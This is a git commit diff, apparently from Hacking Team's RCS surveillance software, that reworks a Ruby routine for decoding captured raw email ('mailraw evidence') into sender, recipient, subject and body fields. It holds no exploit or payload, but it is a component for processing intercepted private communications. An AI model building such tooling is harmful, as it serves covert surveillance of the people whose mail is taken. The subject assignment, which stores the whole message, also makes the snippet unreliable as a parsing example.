4d5429769363186663e882e79704a7f9298cc1ee
daniele <d.milan@hackingteam.it>
2012-04-02 09:44:54 +0200

    fixed mailraw processing

--- lib/rcs-common/evidence/mailraw.rb
+++ lib/rcs-common/evidence/mailraw.rb
@@ -65,29 +65,30 @@ module MailrawEvidence
     ret[:data][:size] = size
     return ret
   end
-  
+
   def decode_content(common_info, chunks)
     info = Hash[common_info]
     eml = chunks.join
     info[:data] = Hash.new if info[:data].nil?
     info[:grid_content] = eml
-    
+
     info[:data][:status] = 0
-    
+
     m = Mail.read_from_string eml
-    info[:data][:from] = m.from
-    info[:data][:to] = m.to
-    info[:data][:cc] = m.cc
-    info[:data][:cc] ||= []
-    info[:data][:subject] = m.subject
+    info[:data][:from] = m.from.join(',') unless m.from.nil?
+    info[:data][:to] = m.to.join(',') unless m.to.nil?
+    info[:data][:cc] = m.cc.join(',') unless m.cc.nil?
+    info[:data][:subject] = m.to_s.force_encoding('UTF-8')
     info[:data][:date] = m.date.to_s
     info[:data][:date] ||= Time.now.to_s
-    info[:data][:body] = m.body.decoded
+    info[:data][:body] = m.body.decoded.force_encoding('UTF-8')
     begin
       info[:da] = m.date.to_time.getgm
     rescue Exception
       info[:da] = Time.now.getutc
     end
+
+    info[:data][:type] = 'mail'.force_encoding('UTF-8')
     
     yield info if block_given?
     :delete_raw
